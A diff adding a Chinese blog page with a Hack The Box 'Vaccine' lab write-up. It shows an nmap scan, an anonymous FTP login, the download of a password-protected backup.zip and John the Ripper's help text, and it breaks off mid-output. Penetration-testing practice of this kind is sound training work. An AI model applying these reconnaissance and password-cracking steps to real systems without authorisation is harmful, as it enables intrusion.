@@ -1,0 +1,701 @@
+
+<!DOCTYPE html><html lang="zh-CN">
+
+<head>
+  <meta charset="utf-8">
+  <meta name="hexo-theme" content="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.29.1" theme-name="Stellar" theme-version="1.29.1">
+  
+  <meta name="generator" content="Hexo 6.3.0">
+  <meta http-equiv='x-dns-prefetch-control' content='on' />
+  
+  <meta name="renderer" content="webkit">
+  <meta name="force-rendering" content="webkit">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  <meta name="HandheldFriendly" content="True" >
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#000">
+  <meta name="theme-color" content="#f9fafb">
+  
+  <title>HTB-Vaccine - FlowsecNagi's</title>
+
+  
+    <meta name="description" content="开局资料： https:&#x2F;&#x2F;blog.csdn.net&#x2F;qq_40927195&#x2F;article&#x2F;details&#x2F;126604517 HTB-Vaccine - laolao - 博客园 (cnblogs.com) 先扫： 123456789101112131415161718192021222324252627282930313233343536373839┌──(r">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HTB-Vaccine">
+<meta property="og:url" content="http://example.com/2023/07/24/HTB/HTB-Vaccine/">
+<meta property="og:site_name" content="FlowsecNagi&#39;s">
+<meta property="og:description" content="开局资料： https:&#x2F;&#x2F;blog.csdn.net&#x2F;qq_40927195&#x2F;article&#x2F;details&#x2F;126604517 HTB-Vaccine - laolao - 博客园 (cnblogs.com) 先扫： 123456789101112131415161718192021222324252627282930313233343536373839┌──(r">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2023-07-24T13:31:16.000Z">
+<meta property="article:modified_time" content="2024-07-13T15:36:16.437Z">
+<meta property="article:author" content="FlowsecNagi">
+<meta property="article:tag" content="HTB">
+<meta property="article:tag" content="笔记">
+<meta property="article:tag" content="STARTING POINT">
+<meta name="twitter:card" content="summary">
+  
+  
+  
+  <meta name="keywords" content="HTB,笔记,STARTING POINT">
+
+  <!-- feed -->
+  
+
+  <link rel="stylesheet" href="/css/main.css?v=1.29.1">
+
+  
+
+  
+    
+<link rel="stylesheet" href="https://gcore.jsdelivr.net/gh/highlightjs/cdn-release@11.9.0/build/styles/atom-one-dark.min.css">
+
+  
+
+  
+</head>
+<body>
+
+<div class="l_body s:aa content tech" id="start" layout="post" ><aside class="l_left"><div class="leftbar-container">
+
+
+<header class="header"><div class="logo-wrap"><a class="avatar" href="/about/"><div class="bg" style="opacity:0;background-image:url(https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/avatar/round/rainbow64@3x.webp);"></div><img no-lazy class="avatar" src="https://ts1.cn.mm.bing.net/th/id/R-C.0fa4f35979fc5e67ad5e5c35da6c70d7?rik=YZ1K7LVgF8WMFQ&riu=http%3a%2f%2fn.sinaimg.cn%2ffront%2f574%2fw910h464%2f20190105%2fiIl6-hrfcctm8375747.png&ehk=Q%2fmgtnAkdu6eq58TlsM%2f%2b8wByTOZ%2fYUhvGbQU7GUwCg%3d&risl=&pid=ImgRaw&r=0" onerror="javascript:this.classList.add('error');this.src='https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/image/2659360.svg';"></a><a class="title" href="/"><div class="main" ff="title">FlowsecNagi's</div><div class="sub normal cap">CyberSecurity</div><div class="sub hover cap" style="opacity:0"> The Righteous Partner</div></a></div></header>
+
+<div class="nav-area">
+<div class="search-wrapper" id="search-wrapper"><form class="search-form"><a class="search-button" onclick="document.getElementById(&quot;search-input&quot;).focus();"><svg t="1705074644177" viewBox="0 0 1025 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="1560" width="200" height="200"><path d="M1008.839137 935.96571L792.364903 719.491476a56.783488 56.783488 0 0 0-80.152866 0 358.53545 358.53545 0 1 1 100.857314-335.166073 362.840335 362.840335 0 0 1-3.689902 170.145468 51.248635 51.248635 0 1 0 99.217358 26.444296 462.057693 462.057693 0 1 0-158.255785 242.303546l185.930047 185.725053a51.248635 51.248635 0 0 0 72.568068 0 51.248635 51.248635 0 0 0 0-72.978056z" p-id="1561"></path><path d="M616.479587 615.969233a50.428657 50.428657 0 0 0-61.498362-5.534852 174.655348 174.655348 0 0 1-177.525271 3.484907 49.403684 49.403684 0 0 0-58.833433 6.76482l-3.074918 2.869923a49.403684 49.403684 0 0 0 8.609771 78.10292 277.767601 277.767601 0 0 0 286.992355-5.739847 49.403684 49.403684 0 0 0 8.404776-76.667958z" p-id="1562"></path></svg></a><input type="text" class="search-input" id="search-input" placeholder="站内搜索"></form><div id="search-result"></div><div class="search-no-result">没有找到内容！</div></div>
+
+
+<nav class="menu dis-select"><a class="nav-item" title="博客" href="/" style="color:#1BCDFC"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M5.879 2.879C5 3.757 5 5.172 5 8v8c0 2.828 0 4.243.879 5.121C6.757 22 8.172 22 11 22h2c2.828 0 4.243 0 5.121-.879C19 20.243 19 18.828 19 16V8c0-2.828 0-4.243-.879-5.121C17.243 2 15.828 2 13 2h-2c-2.828 0-4.243 0-5.121.879M8.25 17a.75.75 0 0 1 .75-.75h3a.75.75 0 0 1 0 1.5H9a.75.75 0 0 1-.75-.75M9 12.25a.75.75 0 0 0 0 1.5h6a.75.75 0 0 0 0-1.5zM8.25 9A.75.75 0 0 1 9 8.25h6a.75.75 0 0 1 0 1.5H9A.75.75 0 0 1 8.25 9" clip-rule="evenodd"/><path fill="currentColor" d="M5.235 4.058C5 4.941 5 6.177 5 8v8c0 1.823 0 3.058.235 3.942L5 19.924c-.975-.096-1.631-.313-2.121-.803C2 18.243 2 16.828 2 14v-4c0-2.829 0-4.243.879-5.121c.49-.49 1.146-.707 2.121-.803zm13.53 15.884C19 19.058 19 17.822 19 16V8c0-1.823 0-3.059-.235-3.942l.235.018c.975.096 1.631.313 2.121.803C22 5.757 22 7.17 22 9.999v4c0 2.83 0 4.243-.879 5.122c-.49.49-1.146.707-2.121.803z" opacity=".5"/></svg></a><a class="nav-item" title="文档" href="/wiki/" style="color:#3DC550"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M14.25 4.48v3.057c0 .111 0 .27.02.406a.936.936 0 0 0 .445.683a.96.96 0 0 0 .783.072c.13-.04.272-.108.378-.159L17 8.005l1.124.534c.106.05.248.119.378.16a.958.958 0 0 0 .783-.073a.936.936 0 0 0 .444-.683c.021-.136.021-.295.021-.406V3.031c.113-.005.224-.01.332-.013C21.154 2.98 22 3.86 22 4.933v11.21c0 1.112-.906 2.01-2.015 2.08c-.97.06-2.108.179-2.985.41c-1.082.286-1.99 1.068-3.373 1.436c-.626.167-1.324.257-1.627.323V5.174c.32-.079 1.382-.203 1.674-.371c.184-.107.377-.216.576-.323m5.478 8.338a.75.75 0 0 1-.546.91l-4 1a.75.75 0 0 1-.364-1.456l4-1a.75.75 0 0 1 .91.546" clip-rule="evenodd"/><path fill="currentColor" d="M18.25 3.151c-.62.073-1.23.18-1.75.336a8.2 8.2 0 0 0-.75.27v3.182l.75-.356l.008-.005a1.13 1.13 0 0 1 .492-.13c.047 0 .094.004.138.01c.175.029.315.1.354.12l.009.005l.749.356V3.647z"/><path fill="currentColor" d="M12 5.214c-.334-.064-1.057-.161-1.718-.339C8.938 4.515 8.05 3.765 7 3.487c-.887-.234-2.041-.352-3.018-.412C2.886 3.007 2 3.9 2 4.998v11.146c0 1.11.906 2.01 2.015 2.079c.97.06 2.108.179 2.985.41c.486.129 1.216.431 1.873.726c1.005.451 2.052.797 3.127 1.034z" opacity=".5"/><path fill="currentColor" d="M4.273 12.818a.75.75 0 0 1 .91-.545l4 1a.75.75 0 1 1-.365 1.455l-4-1a.75.75 0 0 1-.545-.91m.909-4.545a.75.75 0 1 0-.364 1.455l4 1a.75.75 0 0 0 .364-1.455z"/></svg></a><a class="nav-item" title="探索" href="/explore/" style="color:#FA6400"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M20 12a8 8 0 1 1-16 0a8 8 0 0 1 16 0" opacity=".5"/><path fill="currentColor" d="M17.712 5.453c1.047-.193 2.006-.259 2.797-.152c.77.103 1.536.393 1.956 1.064c.446.714.312 1.542-.012 2.258c-.33.728-.918 1.499-1.672 2.268c-1.516 1.547-3.836 3.226-6.597 4.697c-2.763 1.472-5.495 2.484-7.694 2.92c-1.095.217-2.098.299-2.923.201c-.8-.095-1.6-.383-2.032-1.075c-.47-.752-.296-1.63.07-2.379c.375-.768 1.032-1.586 1.872-2.403L4 12.416c0 .219.083.71.168 1.146c.045.23.09.444.123.596c-.652.666-1.098 1.263-1.339 1.756c-.277.567-.208.825-.145.925c.072.116.305.305.937.38c.609.073 1.44.018 2.455-.183c2.02-.4 4.613-1.351 7.28-2.772c2.667-1.42 4.85-3.015 6.23-4.423c.694-.707 1.15-1.334 1.377-1.836c.233-.515.167-.75.107-.844c-.07-.112-.289-.294-.883-.374c-.542-.072-1.272-.041-2.163.112L16.87 5.656c.338-.101.658-.17.842-.203"/></svg></a><a class="nav-item" title="生活" href="/life/" style="color:#FA6400"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M20 12a8 8 0 1 1-16 0a8 8 0 0 1 16 0" opacity=".5"/><path fill="currentColor" d="M17.712 5.453c1.047-.193 2.006-.259 2.797-.152c.77.103 1.536.393 1.956 1.064c.446.714.312 1.542-.012 2.258c-.33.728-.918 1.499-1.672 2.268c-1.516 1.547-3.836 3.226-6.597 4.697c-2.763 1.472-5.495 2.484-7.694 2.92c-1.095.217-2.098.299-2.923.201c-.8-.095-1.6-.383-2.032-1.075c-.47-.752-.296-1.63.07-2.379c.375-.768 1.032-1.586 1.872-2.403L4 12.416c0 .219.083.71.168 1.146c.045.23.09.444.123.596c-.652.666-1.098 1.263-1.339 1.756c-.277.567-.208.825-.145.925c.072.116.305.305.937.38c.609.073 1.44.018 2.455-.183c2.02-.4 4.613-1.351 7.28-2.772c2.667-1.42 4.85-3.015 6.23-4.423c.694-.707 1.15-1.334 1.377-1.836c.233-.515.167-.75.107-.844c-.07-.112-.289-.294-.883-.374c-.542-.072-1.272-.041-2.163.112L16.87 5.656c.338-.101.658-.17.842-.203"/></svg></a><a class="nav-item" title="社交" href="/friends/" style="color:#F44336"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="m13.629 20.472l-.542.916c-.483.816-1.69.816-2.174 0l-.542-.916c-.42-.71-.63-1.066-.968-1.262c-.338-.197-.763-.204-1.613-.219c-1.256-.021-2.043-.098-2.703-.372a5 5 0 0 1-2.706-2.706C2 14.995 2 13.83 2 11.5v-1c0-3.273 0-4.91.737-6.112a5 5 0 0 1 1.65-1.651C5.59 2 7.228 2 10.5 2h3c3.273 0 4.91 0 6.113.737a5 5 0 0 1 1.65 1.65C22 5.59 22 7.228 22 10.5v1c0 2.33 0 3.495-.38 4.413a5 5 0 0 1-2.707 2.706c-.66.274-1.447.35-2.703.372c-.85.015-1.275.022-1.613.219c-.338.196-.548.551-.968 1.262" opacity=".5"/><path fill="currentColor" d="M10.99 14.308c-1.327-.978-3.49-2.84-3.49-4.593c0-2.677 2.475-3.677 4.5-1.609c2.025-2.068 4.5-1.068 4.5 1.609c0 1.752-2.163 3.615-3.49 4.593c-.454.335-.681.502-1.01.502c-.329 0-.556-.167-1.01-.502"/></svg></a></nav>
+</div>
+<div class="widgets">
+
+
+<widget class="widget-wrapper post-list"><div class="widget-header dis-select"><span class="name">最近更新</span></div><div class="widget-body fs14"><a class="item title" href="/2023/07/18/HTB/HTB-Archetype/"><span class="title">HTB-Archetype</span></a><a class="item title" href="/2023/06/29/HTB/NMAP%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8-%E4%B8%BB%E6%9C%BA%E6%9E%9A%E4%B8%BE/%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0/"><span class="title">主机发现</span></a><a class="item title" href="/2023/07/13/%E8%83%A1%E8%A8%80%E4%B9%B1%E8%AF%AD/%E5%8E%86%E7%BB%8F%E5%8D%81%E5%B9%B4%E6%89%BE%E5%AF%BB%E6%AF%95%E7%94%9F%E7%83%AD%E7%88%B1%E4%B9%8B%E4%BA%8B/"><span class="title">历经十年找寻毕生热爱之事</span></a><a class="item title" href="/2023/08/27/xiaodi8/web%E6%94%BB%E9%98%B2%E7%AC%94%E8%AE%B0%E7%AC%AC53%E5%A4%A9/"><span class="title">web攻防笔记第53天</span></a><a class="item title" href="/2023/08/27/xiaodi8/web%E6%94%BB%E9%98%B2%E7%AC%94%E8%AE%B0%E7%AC%AC52%E5%A4%A9/"><span class="title">web攻防笔记第52天</span></a></div></widget>
+</div>
+
+</div></aside><div class="l_main" id="main">
+
+
+
+
+
+<div class="article banner top">
+  <div class="content">
+    <div class="top bread-nav footnote"><div class="left"><div class="flex-row" id="breadcrumb"><a class="cap breadcrumb" href="/">主页</a>
+<span class="sep"></span><a class="cap breadcrumb" href="/">文章</a><span class="sep"></span><a class="cap breadcrumb-link" href="/categories/WEB/">WEB</a> <span class="sep"></span> <a class="cap breadcrumb-link" href="/categories/WEB/%E9%9D%B6%E5%9C%BA/">靶场</a> <span class="sep"></span> <a class="cap breadcrumb-link" href="/categories/WEB/%E9%9D%B6%E5%9C%BA/HTB/">HTB</a></div>
+<div class="flex-row" id="post-meta"><span class="text created">发布于：<time datetime="2023-07-24T13:31:16.000Z">2023-07-24</time></span><span class="sep updated"></span><span class="text updated">更新于：<time datetime="2024-07-13T15:36:16.437Z">2024-07-13</time></span></div></div></div>
+    
+    <div class="bottom only-title">
+      
+      <div class="text-area">
+        <h1 class="text title"><span>HTB-Vaccine</span></h1>
+        
+      </div>
+    </div>
+    
+  </div>
+  </div><article class="md-text content"><p>开局资料：</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_40927195/article/details/126604517">https://blog.csdn.net/qq_40927195&#x2F;article&#x2F;details&#x2F;126604517</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/chrysanthemum/p/15130130.html">HTB-Vaccine - laolao - 博客园 (cnblogs.com)</a></p>
+<p>先扫：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/home/kali]<br>└─# nmap -sC -sV 10.129.103.172<br>Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-24 01:48 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 10.129.103.172<br>Host is up (0.42s latency).<br>Not shown: 944 closed tcp ports (reset), 53 filtered tcp ports (no-response)<br>PORT   STATE SERVICE VERSION<br>21/tcp open  ftp     vsftpd 3.0.3<br>| ftp-anon: Anonymous FTP login allowed (FTP code 230)<br>|_-rwxr-xr-x    1 0        0            2533 Apr 13  2021 backup.zip<br>| ftp-syst: <br>|   STAT: <br>| FTP server status:<br>|      Connected to ::ffff:10.10.14.54<br>|      Logged <span class="hljs-keyword">in</span> as ftpuser<br>|      TYPE: ASCII<br>|      No session bandwidth <span class="hljs-built_in">limit</span><br>|      Session <span class="hljs-built_in">timeout</span> <span class="hljs-keyword">in</span> seconds is 300<br>|      Control connection is plain text<br>|      Data connections will be plain text<br>|      At session startup, client count was 3<br>|      vsFTPd 3.0.3 - secure, fast, stable<br>|_End of status<br>22/tcp open  ssh     OpenSSH 8.0p1 Ubuntu 6ubuntu0.1 (Ubuntu Linux; protocol 2.0)<br>| ssh-hostkey: <br>|   3072 c0ee58077534b00b9165b259569527a4 (RSA)<br>|   256 ac6e81188922d7a7417d814f1bb8b251 (ECDSA)<br>|_  256 425bc321dfefa20bc95e03421d69d028 (ED25519)<br>80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))<br>|_http-title: MegaCorp Login<br>| http-cookie-flags: <br>|   /: <br>|     PHPSESSID: <br>|_      httponly flag not <span class="hljs-built_in">set</span><br>|_http-server-header: Apache/2.4.41 (Ubuntu)<br>Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel<br><br>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 261.22 seconds<br></code></pre></td></tr></table></figure>
+
+<p>发现FTP允许匿名登录：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/home/kali/Desktop]<br>└─# ftp 10.129.103.172<br>Connected to 10.129.103.172.<br>220 (vsFTPd 3.0.3)<br>Name (10.129.103.172:kali): anonymous<br>331 Please specify the password.<br>Password: <br>230 Login successful.<br>Remote system <span class="hljs-built_in">type</span> is UNIX.<br>Using binary mode to transfer files.<br>ftp&gt; <span class="hljs-built_in">dir</span><br>229 Entering Extended Passive Mode (|||10156|)<br>150 Here comes the directory listing.<br>-rwxr-xr-x    1 0        0            2533 Apr 13  2021 backup.zip<br>226 Directory send OK.<br>ftp&gt; get backup.zip<br><span class="hljs-built_in">local</span>: backup.zip remote: backup.zip<br>229 Entering Extended Passive Mode (|||10939|)<br>150 Opening BINARY mode data connection <span class="hljs-keyword">for</span> backup.zip (2533 bytes).<br>100% |************************************|  2533        8.59 MiB/s    00:00 ETA<br>226 Transfer complete.<br>2533 bytes received <span class="hljs-keyword">in</span> 00:00 (16.95 KiB/s)<br>ftp&gt; <span class="hljs-built_in">exit</span><br>221 Goodbye.<br><br>┌──(root㉿kali)-[/home/kali/Desktop]<br>└─# unzip backup.zip <br>Archive:  backup.zip<br>[backup.zip] index.php password: <br>password incorrect--reenter:<br></code></pre></td></tr></table></figure>
+
+<p>下载下来buckup.zip，解压发现需要密码，尝试简单密码后发现不行，直接开膛手crack：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/home/kali/Desktop]<br>└─# john --<span class="hljs-built_in">help</span>                                      <br>John the Ripper 1.9.0-jumbo-1+bleeding-aec1328d6c 2021-11-02 10:45:52 +0100 OMP [linux-gnu 64-bit x86_64 SSE2 AC]<br>Copyright (c) 1996-2021 by Solar Designer and others<br>Homepage: https://www.openwall.com/john/<br><br>Usage: john [OPTIONS] [PASSWORD-FILES]<br><br>--<span class="hljs-built_in">help</span>                     Print usage summary<br>--single[=SECTION[,..]]    <span class="hljs-string">&quot;Single crack&quot;</span> mode, using default or named rules<br>--single=:rule[,..]        Same, using <span class="hljs-string">&quot;immediate&quot;</span> rule(s)<br>--single-seed=WORD[,WORD]  Add static seed word(s) <span class="hljs-keyword">for</span> all salts <span class="hljs-keyword">in</span> single mode<br>--single-wordlist=FILE     *Short* wordlist with static seed words/morphemes<br>--single-user-seed=FILE    Wordlist with seeds per username (user:password[s]<br>                           format)<br>--single-pair-max=N        Override max. number of word pairs generated (6)<br>--no-single-pair           Disable single word pair generation<br>--[no-]single-retest-guess Override config <span class="hljs-keyword">for</span> SingleRetestGuess<br>--wordlist[=FILE] --stdin  Wordlist mode, <span class="hljs-built_in">read</span> words from FILE or stdin<br>                  --pipe   like --stdin, but bulk reads, and allows rules<br>--rules[=SECTION[,..]]     Enable word mangling rules (<span class="hljs-keyword">for</span> wordlist or PRINCE<br>                           modes), using default or named rules<br>--rules=:rule[;..]]        Same, using <span class="hljs-string">&quot;immediate&quot;</span> rule(s)<br>--rules-stack=SECTION[,..] Stacked rules, applied after regular rules or to<br>                           modes that otherwise don<span class="hljs-string">&#x27;t support rules</span><br><span class="hljs-string">--rules-stack=:rule[;..]   Same, using &quot;immediate&quot; rule(s)</span><br><span class="hljs-string">--rules-skip-nop           Skip any NOP &quot;:&quot; rules (you already ran w/o rules)</span><br><span class="hljs-string">--loopback[=FILE]          Like --wordlist, but extract words from a .pot file</span><br><span class="hljs-string">--mem-file-size=SIZE       Size threshold for wordlist preload (default 2048 MB)</span><br><span class="hljs-string">--dupe-suppression         Suppress all dupes in wordlist (and force preload)</span><br><span class="hljs-string">--incremental[=MODE]       &quot;Incremental&quot; mode [using section MODE]</span><br><span class="hljs-string">--incremental-charcount=N  Override CharCount for incremental mode</span><br><span class="hljs-string">--external=MODE            External mode or word filter</span><br><span class="hljs-string">--mask[=MASK]              Mask mode using MASK (or default from john.conf)</span><br><span class="hljs-string">--markov[=OPTIONS]         &quot;Markov&quot; mode (see doc/MARKOV)</span><br><span class="hljs-string">--mkv-stats=FILE           &quot;Markov&quot; stats file</span><br><span class="hljs-string">--prince[=FILE]            PRINCE mode, read words from FILE</span><br><span class="hljs-string">--prince-loopback[=FILE]   Fetch words from a .pot file</span><br><span class="hljs-string">--prince-elem-cnt-min=N    Minimum number of elements per chain (1)</span><br><span class="hljs-string">--prince-elem-cnt-max=[-]N Maximum number of elements per chain (negative N is</span><br><span class="hljs-string">                           relative to word length) (8)</span><br><span class="hljs-string">--prince-skip=N            Initial skip</span><br><span class="hljs-string">--prince-limit=N           Limit number of candidates generated</span><br><span class="hljs-string">--prince-wl-dist-len       Calculate length distribution from wordlist</span><br><span class="hljs-string">--prince-wl-max=N          Load only N words from input wordlist</span><br><span class="hljs-string">--prince-case-permute      Permute case of first letter</span><br><span class="hljs-string">--prince-mmap              Memory-map infile (not available with case permute)</span><br><span class="hljs-string">--prince-keyspace          Just show total keyspace that would be produced</span><br><span class="hljs-string">                           (disregarding skip and limit)</span><br><span class="hljs-string">--subsets[=CHARSET]        &quot;Subsets&quot; mode (see doc/SUBSETS)</span><br><span class="hljs-string">--subsets-required=N       The N first characters of &quot;subsets&quot; charset are</span><br><span class="hljs-string">                           the &quot;required set&quot;</span><br><span class="hljs-string">--subsets-min-diff=N       Minimum unique characters in subset</span><br><span class="hljs-string">--subsets-max-diff=[-]N    Maximum unique characters in subset (negative N is</span><br><span class="hljs-string">                           relative to word length)</span><br><span class="hljs-string">--subsets-prefer-short     Prefer shorter candidates over smaller subsets</span><br><span class="hljs-string">--subsets-prefer-small     Prefer smaller subsets over shorter candidates</span><br><span class="hljs-string">--make-charset=FILE        Make a charset, FILE will be overwritten</span><br><span class="hljs-string">--stdout[=LENGTH]          Just output candidate passwords [cut at LENGTH]</span><br><span class="hljs-string">--session=NAME             Give a new session the NAME</span><br><span class="hljs-string">--status[=NAME]            Print status of a session [called NAME]</span><br><span class="hljs-string">--restore[=NAME]           Restore an interrupted session [called NAME]</span><br><span class="hljs-string">--[no-]crack-status        Emit a status line whenever a password is cracked</span><br><span class="hljs-string">--progress-every=N         Emit a status line every N seconds</span><br><span class="hljs-string">--show[=left]              Show cracked passwords [if =left, then uncracked]</span><br><span class="hljs-string">--show=formats             Show information about hashes in a file (JSON)</span><br><span class="hljs-string">--show=invalid             Show lines that are not valid for selected format(s)</span><br><span class="hljs-string">--test[=TIME]              Run tests and benchmarks for TIME seconds each</span><br><span class="hljs-string">                           (if TIME is explicitly 0, test w/o benchmark)</span><br><span class="hljs-string">--stress-test[=TIME]       Loop self tests forever</span><br><span class="hljs-string">--test-full=LEVEL          Run more thorough self-tests</span><br><span class="hljs-string">--no-mask                  Used with --test for alternate benchmark w/o mask</span><br><span class="hljs-string">--skip-self-tests          Skip self tests</span><br><span class="hljs-string">--users=[-]LOGIN|UID[,..]  [Do not] load this (these) user(s) only</span><br><span class="hljs-string">--groups=[-]GID[,..]       Load users [not] of this (these) group(s) only</span><br><span class="hljs-string">--shells=[-]SHELL[,..]     Load users with[out] this (these) shell(s) only</span><br><span class="hljs-string">--salts=[-]COUNT[:MAX]     Load salts with[out] COUNT [to MAX] hashes, or</span><br><span class="hljs-string">--salts=#M[-N]             Load M [to N] most populated salts</span><br><span class="hljs-string">--costs=[-]C[:M][,...]     Load salts with[out] cost value Cn [to Mn]. For</span><br><span class="hljs-string">                           tunable cost parameters, see doc/OPTIONS</span><br><span class="hljs-string">--fork=N                   Fork N processes</span><br><span class="hljs-string">--node=MIN[-MAX]/TOTAL     This node&#x27;</span>s number range out of TOTAL count<br>--save-memory=LEVEL        Enable memory saving, at LEVEL 1..3<br>--log-stderr               Log to screen instead of file<br>--verbosity=N              Change verbosity (1-5 or 6 <span class="hljs-keyword">for</span> debug, default 3)<br>--no-log                   Disables creation and writing to john.log file<br>--bare-always-valid=Y      Treat bare hashes as valid (Y/N)<br>--catch-up=NAME            Catch up with existing (paused) session NAME<br>--config=FILE              Use FILE instead of john.conf or john.ini<br>--encoding=NAME            Input encoding (eg. UTF-8, ISO-8859-1). See also<br>                           doc/ENCODINGS.<br>--input-encoding=NAME      Input encoding (<span class="hljs-built_in">alias</span> <span class="hljs-keyword">for</span> --encoding)<br>--internal-codepage=NAME   Codepage used <span class="hljs-keyword">in</span> rules/masks (see doc/ENCODINGS)<br>--target-encoding=NAME     Output encoding (used by format)<br>--force-tty                Set up terminal <span class="hljs-keyword">for</span> reading keystrokes even <span class="hljs-keyword">if</span> we<span class="hljs-string">&#x27;re</span><br><span class="hljs-string">                           not the foreground process</span><br><span class="hljs-string">--field-separator-char=C   Use &#x27;</span>C<span class="hljs-string">&#x27; instead of the &#x27;</span>:<span class="hljs-string">&#x27; in input and pot files</span><br><span class="hljs-string">--[no-]keep-guessing       Try finding plaintext collisions</span><br><span class="hljs-string">--list=WHAT                List capabilities, see --list=help or doc/OPTIONS</span><br><span class="hljs-string">--length=N                 Shortcut for --min-len=N --max-len=N</span><br><span class="hljs-string">--min-length=N             Request a minimum candidate length in 